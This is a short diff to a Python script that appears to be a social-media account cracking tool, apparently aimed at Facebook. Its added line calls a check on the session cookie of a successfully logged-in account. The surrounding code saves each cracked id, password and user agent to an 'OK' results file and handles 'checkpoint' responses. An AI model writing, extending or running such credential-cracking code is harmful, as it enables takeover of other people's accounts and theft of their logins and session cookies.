@@ -1787,6 +1787,7 @@ def validate(idf,pwv,url):
                 tree.add(f"[green]{idf}").add(f"[green]{pw}").add(f"[green]{ua}\n")
                 tree.add(f"[green]{kuki}\n")
                 cetak(tree)
+                cek_apk(kuki)
                 open("OK/" + okc, "a").write(idf + "|" + pw + "|" + ua + "\n")
                 break
             elif "checkpoint" in po.cookies.get_dict().keys():
